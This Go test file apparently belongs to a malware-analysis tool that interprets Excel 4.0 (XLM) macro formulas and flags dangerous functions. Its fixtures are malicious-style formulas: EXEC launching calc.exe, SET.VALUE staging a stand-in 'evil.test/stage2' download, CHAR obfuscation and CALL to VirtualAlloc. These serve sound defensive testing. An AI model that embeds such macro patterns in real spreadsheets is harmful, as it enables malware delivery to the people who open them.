package extract

import (
	"archive/zip"
	"bytes"
	"encoding/xml"
	"strings"
	"testing"
	"time"
)

// --- normCoord unit tests ---

func TestNormCoord(t *testing.T) {
	cases := []struct{ in, want string }{
		{"$A$1", "A1"},
		{"A1", "A1"},
		{"$A1", "A1"},
		{"A$1", "A1"},
		{"$Z$999", "Z999"},
		{"", ""},
		{"NOTACOORD", ""},
	}
	for _, c := range cases {
		got := normCoord(c.in)
		if got != c.want {
			t.Errorf("normCoord(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// --- interpretXLMCells unit tests ---

// TestInterpSetValueThenExec: A1 formula =SET.VALUE(A2,"calc.exe"), A3
// formula =EXEC(A2). After interpretation A3 should resolve A2 to "calc.exe".
func TestInterpSetValueThenExec(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=SET.VALUE(A2,"calc.exe")`},
		{coord: "A3", formula: `=EXEC(A2)`},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})

	joined := bytes.Join(out, []byte("\n"))
	if !bytes.Contains(joined, []byte("calc.exe")) {
		t.Errorf("expected calc.exe in output; got %q", joined)
	}
	if !bytes.Contains(joined, []byte("XLM-DANGEROUS-FUNC EXEC")) {
		t.Errorf("expected XLM-DANGEROUS-FUNC EXEC in output; got %q", joined)
	}
}

// TestInterpPrecomputedValue: A1 formula =EXEC(A2), A2 value "http://evil.test".
// A1 should resolve A2 from the pre-computed value.
func TestInterpPrecomputedValue(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=EXEC(A2)`},
		{coord: "A2", value: "http://evil.test"},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})

	joined := bytes.Join(out, []byte("\n"))
	if !bytes.Contains(joined, []byte("http://evil.test")) {
		t.Errorf("expected http://evil.test in output; got %q", joined)
	}
}

// TestInterpNoRefRegression: a lone formula with no cross-cell refs must still
// fold and emit correctly (no regression from the interpreter pass).
func TestInterpNoRefRegression(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=EXEC(CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99))`},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})

	joined := bytes.Join(out, []byte("\n"))
	if !bytes.Contains(joined, []byte("=EXEC(calc)")) {
		t.Errorf("expected =EXEC(calc) in output; got %q", joined)
	}
}

// TestInterp1LevelOnly: A2 formula is =A3 (not SET.VALUE), A3 value is "x".
// A1 formula =EXEC(A2) must resolve A2 to the literal formula text "=A3",
// NOT to "x" — only 1 level of indirection.
func TestInterp1LevelOnly(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=EXEC(A2)`},
		{coord: "A2", formula: `=A3`},
		{coord: "A3", value: "x"},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})

	joined := string(bytes.Join(out, []byte("\n")))
	// A2 has no <v> value and is not a SET.VALUE — PASS 1 must NOT add it.
	// PASS 2 folds A1's formula; A2 is not in vals, so it stays as-is.
	if strings.Contains(joined, "=EXEC(x)") {
		t.Errorf("1-level-only violated: found =EXEC(x) (two-hop), want A2 unresolved; got %q", joined)
	}
}

// TestInterpConsecutiveRefs: two refs in one formula separated by a single
// delimiter (CALL(B2,C3)) must BOTH resolve — a boundary regex that consumes
// the delimiter would hide the second ref from the non-overlapping scan.
func TestInterpConsecutiveRefs(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=CALL(B2,C3)`},
		{coord: "B2", value: "kernel32"},
		{coord: "C3", value: "VirtualAlloc"},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})
	joined := string(bytes.Join(out, []byte("\n")))
	if !strings.Contains(joined, "kernel32") || !strings.Contains(joined, "VirtualAlloc") {
		t.Errorf("both consecutive refs must resolve; got %q", joined)
	}
}

func TestInterpAbsoluteAndLowercaseRefs(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=SET.VALUE($A$2,"calc.exe")`},
		{coord: "A3", formula: `=EXEC($A$2)`},
		{coord: "A4", formula: `=EXEC(a2)`},
	}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Time{})

	joined := string(bytes.Join(out, []byte("\n")))
	if strings.Count(joined, "=EXEC(calc.exe)") != 2 {
		t.Fatalf("absolute and lowercase refs must resolve; got %q", joined)
	}
}

func TestSubstituteRefsSkipsQuotedAndQualifiedRefs(t *testing.T) {
	got := substituteRefs(
		`=EXEC("A2")&EXEC(Sheet2!A2)&EXEC(A2)`,
		map[string]string{"A2": "calc.exe"},
	)
	want := `=EXEC("A2")&EXEC(Sheet2!A2)&EXEC(calc.exe)`
	if got != want {
		t.Fatalf("substituteRefs() = %q, want %q", got, want)
	}
}

func TestSubstituteRefsCapLeavesRemainingRefs(t *testing.T) {
	formula := "=" + strings.Repeat("A1&", maxXLMInterpSubs+1)
	got := substituteRefs(formula, map[string]string{"A1": "resolved"})
	if strings.Count(got, "resolved") != maxXLMInterpSubs {
		t.Fatalf("substitutions = %d, want %d", strings.Count(got, "resolved"), maxXLMInterpSubs)
	}
	if !strings.HasSuffix(got, "A1&") {
		t.Fatalf("cap must leave the remaining reference unchanged, got %q", got[len(got)-20:])
	}
}

func TestInterpDeadline(t *testing.T) {
	cells := []xlmCell{{coord: "A1", formula: `=EXEC("calc.exe")`}}
	var out [][]byte
	total := 0
	interpretXLMCells(cells, &out, &total, time.Now().Add(-time.Second))
	if len(out) != 0 {
		t.Fatalf("expired deadline emitted %d streams", len(out))
	}
}

// TestInterpCapNoPanic: generate > maxXLMInterpCells cells, call
// interpretXLMCells — must not panic.
func TestInterpCapNoPanic(t *testing.T) {
	cells := make([]xlmCell, maxXLMInterpCells+100)
	for i := range cells {
		cells[i] = xlmCell{
			coord:   "A1",
			formula: `=EXEC("calc.exe")`,
		}
	}
	var out [][]byte
	total := 0
	// Must not panic.
	interpretXLMCells(cells, &out, &total, time.Time{})
}

// --- End-to-end OOXML (.xlsm) test ---

// makeXLSMWithCells builds a minimal .xlsm in-memory zip containing a
// macrosheet with the supplied cells (coord, formula, value).
func makeXLSMWithCells(t *testing.T, cells []xlmCell) []byte {
	t.Helper()

	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	sb.WriteString(`<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">`)
	sb.WriteString(`<sheetData>`)

	row := 1
	for _, cell := range cells {
		sb.WriteString(`<row r="`)
		sb.WriteString(strings.TrimLeft(cell.coord, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$"))
		sb.WriteString(`"><c r="`)
		sb.WriteString(cell.coord)
		sb.WriteString(`">`)
		if cell.formula != "" {
			sb.WriteString(`<f>`)
			var esc strings.Builder
			_ = xml.EscapeText(&esc, []byte(cell.formula))
			sb.WriteString(esc.String())
			sb.WriteString(`</f>`)
		}
		if cell.value != "" {
			sb.WriteString(`<v>`)
			var esc strings.Builder
			_ = xml.EscapeText(&esc, []byte(cell.value))
			sb.WriteString(esc.String())
			sb.WriteString(`</v>`)
		}
		sb.WriteString(`</c></row>`)
		row++
	}
	sb.WriteString(`</sheetData></worksheet>`)

	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	addZipEntry(t, zw, "xl/macrosheets/sheet1.xml", sb.String())
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// TestInterpEndToEndXlsm builds a synthetic .xlsm zip with cross-cell XLM
// cells and verifies that fromOOXMLXLMFold resolves them correctly.
func TestInterpEndToEndXlsm(t *testing.T) {
	cells := []xlmCell{
		{coord: "A1", formula: `=SET.VALUE(A2,"http://evil.test/stage2")`},
		{coord: "A2", value: ""},
		{coord: "A3", formula: `=EXEC(A2)`},
	}
	buf := makeXLSMWithCells(t, cells)

	zr, err := zip.NewReader(bytes.NewReader(buf), int64(len(buf)))
	if err != nil {
		t.Fatal(err)
	}
	var out [][]byte
	fromOOXMLXLMFold(zr, &out, time.Time{})

	joined := bytes.Join(out, []byte("\n"))
	if !bytes.Contains(joined, []byte("http://evil.test/stage2")) {
		t.Errorf("expected resolved URL in output; got %q", joined)
	}
	if !bytes.Contains(joined, []byte("XLM-DANGEROUS-FUNC EXEC")) {
		t.Errorf("expected XLM-DANGEROUS-FUNC EXEC in output; got %q", joined)
	}
}
